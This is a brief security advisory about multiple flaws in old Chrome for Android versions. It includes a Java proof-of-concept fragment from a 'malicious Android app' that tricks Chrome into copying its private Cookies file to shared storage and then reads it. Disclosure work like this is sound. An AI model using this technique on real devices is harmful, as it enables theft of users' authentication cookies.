Google Chrome for Android is prone to multiple vulnerabilities.

Attackers may exploit these issues to execute arbitrary code in the context of the browser, obtain potentially sensitive information, bypass the same-origin policy, and steal cookie-based authentication credentials; other attacks are also possible.

Versions prior to Chrome for Android 18.0.1025308 are vulnerable.

// This is a part of malicious Android app.
  public void attack() {
    try {
      // let Chrome app load its Cookies file, so that Chrome app
      // automatically save it to /sdcard/Download/ directory.
      Intent intent = new Intent("android.intent.action.VIEW");
      intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
      intent.setData(Uri.parse("file:///data/data/com.android.chrome/app_chrome/Default/Cookies"));
      startActivity(intent);

      // wait a few seconds
      Thread.sleep(3000);

      // read the Cookie file (/sdcard/Download/Cookies.bin)
      FileInputStream fis = new FileInputStream("/sdcard/Download/Cookies.bin");
      ...
